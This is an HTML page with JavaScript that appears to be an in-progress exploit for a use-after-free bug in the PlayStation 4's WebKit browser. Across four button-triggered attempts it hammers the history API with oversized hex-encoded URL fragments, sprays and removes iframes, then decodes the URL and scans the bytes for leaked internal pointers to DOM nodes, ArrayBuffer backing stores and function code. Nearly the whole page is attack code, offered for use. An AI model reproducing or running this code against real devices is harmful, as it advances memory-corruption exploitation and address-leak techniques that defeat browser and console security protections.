
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit UAF - Real Pointer Leak 2</title>
</head>
<body>
<h2>PS4 WebKit UAF - Real Pointer Leak Attempts</h2>
<button onclick="runStateSerializationLeak()">ATTEMPT 1 - State Serialization Leak</button>
<button onclick="runDOMReferenceLeak()">ATTEMPT 2 - DOM Reference Leak</button>
<button onclick="runArrayBufferLeak()">ATTEMPT 3 - ArrayBuffer Backing Store Leak</button>
<button onclick="runFunctionObjectLeak()">ATTEMPT 4 - Function Object Leak</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

function encodeBytes(bytes) {
    return bytes.map(b => '%' + b.toString(16).padStart(2,'0')).join('');
}

function decodeHexString(str) {
    let result = [];
    for(let i=0; i<str.length; i+=3) {
        if(str[i] === '%') {
            result.push(parseInt(str.substr(i+1, 2), 16));
        }
    }
    return result;
}

function readU32(bytes, offset) {
    if(offset + 3 >= bytes.length) return null;
    return bytes[offset] |
           (bytes[offset+1] << 8) |
           (bytes[offset+2] << 16) |
           (bytes[offset+3] << 24);
}

function isLikelyPointer(val) {
    // PS4 userspace addresses typically 0x00xxxxxx - 0x7Fxxxxxx
    // But we're limited to ASCII (0x00-0x7F per byte)
    // So max is 0x7F7F7F7F
    
    // Look for values that:
    // - Are non-zero
    // - Have reasonable distribution (not all same byte)
    // - Are 4-byte aligned (bottom 2 bits = 0)
    
    if(val === 0) return false;
    if(val === 0x11111111 || val === 0x22222222) return false; // our test values
    
    let b0 = val & 0xFF;
    let b1 = (val >> 8) & 0xFF;
    let b2 = (val >> 16) & 0xFF;
    let b3 = (val >> 24) & 0xFF;
    
    // Check if bytes are varied
    if(b0 === b1 && b1 === b2 && b2 === b3) return false;
    
    // Check alignment
    if((val & 0x3) !== 0) return false;
    
    return true;
}

// ATTEMPT 1 - State serialization
async function runStateSerializationLeak(){
    logEl.textContent = "";
    log("=== ATTEMPT 1: State Serialization Leak ===\n");
    
    log("Strategy: Put complex objects in history.state");
    log("Hope StructuredClone leaks internal pointers\n");
    
    let size = 977;
    const STEP = 14461;
    
    // Create objects to leak
    let leakTargets = {
        buffer: new ArrayBuffer(1024),
        array: new Uint32Array(256),
        string: "A".repeat(1000),
        nested: {
            a: new ArrayBuffer(512),
            b: new Uint32Array(128)
        }
    };
    
    log("[SETUP] Triggering UAF with complex state objects...");
    
    for(let i=0; i<47; i++){
        let frag = encodeBytes(Array(size).fill(0x41 + (i % 26)));
        
        // Include leak targets in state
        let state = {
            iter: i,
            targets: leakTargets,
            marker: 0x12345678
        };
        
        history.pushState(state, "", "#" + frag);
        history.replaceState(state, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
        
        size += STEP;
        await sleep(5);
    }
    
    await sleep(120);
    
    let frames = [];
    for(let i=0; i<50; i++){
        let f = document.createElement("iframe");
        document.body.appendChild(f);
        try {
            let d = f.contentDocument;
            d.open();
            d.write("<html><body>X</body></html>");
            d.close();
        } catch(e){}
        frames.push(f);
    }
    frames.forEach(f=>f.remove());
    await sleep(80);
    
    log("\n[LEAK] Reading URL...");
    let url = document.URL;
    let hashStart = url.indexOf('#');
    let encoded = url.substring(hashStart + 1);
    let decoded = decodeHexString(encoded);
    
    log("Decoded bytes: " + decoded.length + "\n");
    
    log("[SCAN] Looking for non-injected values (potential pointers):");
    
    let candidates = [];
    for(let i=0; i<decoded.length-3; i+=4){
        let val = readU32(decoded, i);
        if(isLikelyPointer(val)){
            candidates.push({offset: i, value: val});
        }
    }
    
    log("Pointer candidates found: " + candidates.length);
    
    if(candidates.length > 0){
        log("\nTop 10 candidates:");
        candidates.slice(0, 10).forEach(c => {
            log("  Offset " + c.offset + ": 0x" + c.value.toString(16).padStart(8,'0'));
        });
        log("\nPOSSIBLE REAL POINTER LEAK!");
    } else {
        log("\nNo likely pointers found");
    }
    
    log("\n=== ATTEMPT 1 END ===");
}

// ATTEMPT 2 - DOM reference
async function runDOMReferenceLeak(){
    logEl.textContent = "";
    log("=== ATTEMPT 2: DOM Reference Leak ===\n");
    
    log("Strategy: Store DOM nodes in history state");
    log("DOM nodes contain many internal pointers\n");
    
    // Create DOM nodes
    let div = document.createElement("div");
    div.id = "leak_target";
    div.innerHTML = "<span>test</span>";
    document.body.appendChild(div);
    
    let size = 977;
    const STEP = 14461;
    
    log("[SETUP] Triggering UAF with DOM references...");
    
    for(let i=0; i<47; i++){
        let frag = encodeBytes(Array(size).fill(0x42));
        
        let state = {
            iter: i,
            dom: div,
            child: div.firstChild,
            text: div.firstChild.firstChild
        };
        
        history.pushState(state, "", "#" + frag);
        history.replaceState(state, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
        
        size += STEP;
        await sleep(5);
    }
    
    await sleep(120);
    
    let frames = [];
    for(let i=0; i<50; i++){
        let f = document.createElement("iframe");
        document.body.appendChild(f);
        try {
            let d = f.contentDocument;
            d.open();
            d.write("<html><body>X</body></html>");
            d.close();
        } catch(e){}
        frames.push(f);
    }
    frames.forEach(f=>f.remove());
    await sleep(80);
    
    log("\n[LEAK] Reading URL...");
    let url = document.URL;
    let hashStart = url.indexOf('#');
    let encoded = url.substring(hashStart + 1);
    let decoded = decodeHexString(encoded);
    
    log("Decoded bytes: " + decoded.length);
    
    // Check if all bytes are 0x42
    let nonB = 0;
    for(let i=0; i<Math.min(1000, decoded.length); i++){
        if(decoded[i] !== 0x42) nonB++;
    }
    
    log("Non-0x42 bytes in first 1000: " + nonB);
    
    if(nonB > 10){
        log("\nDifferent data detected - analyzing...");
        
        log("\nFirst 100 bytes (hex):");
        let hex = "";
        for(let i=0; i<100 && i<decoded.length; i++){
            hex += decoded[i].toString(16).padStart(2,'0') + " ";
            if((i+1) % 16 === 0) {
                log(hex);
                hex = "";
            }
        }
    } else {
        log("\nAll bytes are 0x42 - DOM not serialized to fragment");
    }
    
    log("\n=== ATTEMPT 2 END ===");
}

// ATTEMPT 3 - ArrayBuffer backing store
async function runArrayBufferLeak(){
    logEl.textContent = "";
    log("=== ATTEMPT 3: ArrayBuffer Backing Store Leak ===\n");
    
    log("Strategy: ArrayBuffer has backing store pointer");
    log("Try to leak it via fragment corruption\n");
    
    let size = 977;
    const STEP = 14461;
    
    log("[SETUP] Creating large ArrayBuffers...");
    let buffers = [];
    for(let i=0; i<47; i++){
        buffers.push(new ArrayBuffer(4096));
    }
    
    log("[SETUP] Triggering UAF...");
    
    for(let i=0; i<48; i++){
        // Fill with controlled pattern
        let pattern = [];
        for(let j=0; j<size; j++){
            pattern.push(0x43 + (j % 16));
        }
        let frag = encodeBytes(pattern);
        
        history.pushState({buffers: buffers}, "", "#" + frag);
        history.replaceState({buffers: buffers}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
        
        size += STEP;
        await sleep(5);
    }
    
    await sleep(120);
    
    let frames = [];
    for(let i=0; i<80; i++){
        let f = document.createElement("iframe");
        document.body.appendChild(f);
        try {
            let d = f.contentDocument;
            d.open();
            d.write("<html><body>X</body></html>");
            d.close();
        } catch(e){}
        frames.push(f);
    }
    frames.forEach(f=>f.remove());
    await sleep(80);
    
    log("\n[LEAK] Reading URL...");
    let url = document.URL;
    let hashStart = url.indexOf('#');
    let encoded = url.substring(hashStart + 1);
    let decoded = decodeHexString(encoded);
    
    log("Decoded bytes: " + decoded.length + "\n");
    
    log("[SCAN] Looking for unexpected patterns:");
    
    let unexpected = [];
    for(let i=0; i<Math.min(10000, decoded.length); i++){
        let expected = 0x43 + (i % 16);
        if(decoded[i] !== expected){
            unexpected.push({offset: i, expected: expected, actual: decoded[i]});
        }
    }
    
    log("Unexpected bytes: " + unexpected.length);
    
    if(unexpected.length > 0){
        log("\nFirst 10 unexpected bytes:");
        unexpected.slice(0, 10).forEach(u => {
            log("  Offset " + u.offset + ": expected 0x" + 
                u.expected.toString(16) + ", got 0x" + 
                u.actual.toString(16));
        });
        log("\nPOSSIBLE CORRUPTION OR LEAK!");
    }
    
    log("\n=== ATTEMPT 3 END ===");
}

// ATTEMPT 4 - Function object
async function runFunctionObjectLeak(){
    logEl.textContent = "";
    log("=== ATTEMPT 4: Function Object Leak ===\n");
    
    log("Strategy: Function objects contain code pointers");
    log("Try to leak via state serialization\n");
    
    let size = 977;
    const STEP = 14461;
    
    let leakFunc = function leakTarget() {
        return "LEAK";
    };
    
    log("[SETUP] Triggering UAF with function objects...");
    
    for(let i=0; i<48; i++){
        let frag = encodeBytes(Array(size).fill(0x44));
        
        let state = {
            iter: i,
            func: leakFunc,
            bound: leakFunc.bind(null),
            arrow: () => "ARROW"
        };
        
        history.pushState(state, "", "#" + frag);
        history.replaceState(state, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(()=>history.back(), 0);
        
        size += STEP;
        await sleep(5);
    }
    
    await sleep(120);
    
    let frames = [];
    for(let i=0; i<80; i++){
        let f = document.createElement("iframe");
        document.body.appendChild(f);
        try {
            let d = f.contentDocument;
            d.open();
            d.write("<html><body>X</body></html>");
            d.close();
        } catch(e){}
        frames.push(f);
    }
    frames.forEach(f=>f.remove());
    await sleep(80);
    
    log("\n[LEAK] Reading URL...");
    let url = document.URL;
    let hashStart = url.indexOf('#');
    let encoded = url.substring(hashStart + 1);
    let decoded = decodeHexString(encoded);
    
    log("Decoded bytes: " + decoded.length);
    
    // All should be 0x44 if functions aren't serialized
    let allD = true;
    for(let i=0; i<Math.min(1000, decoded.length); i++){
        if(decoded[i] !== 0x44){
            allD = false;
            break;
        }
    }
    
    if(allD){
        log("\nAll bytes are 0x44 - functions not serialized");
    } else {
        log("\nDifferent data found - possible function serialization!");
    }
    
    log("\n=== ATTEMPT 4 END ===");
}

log("PS4 WebKit UAF - Real Pointer Leak Attempts");
log("Goal: Find method to leak WebKit internal pointers");
log("\nAttempts:");
log("1. State Serialization - complex objects");
log("2. DOM References - DOM node pointers");
log("3. ArrayBuffer - backing store pointers");
log("4. Function Objects - code pointers");
log("\nExecute in order - looking for ANY non-injected data");
</script>
</body>
</html>
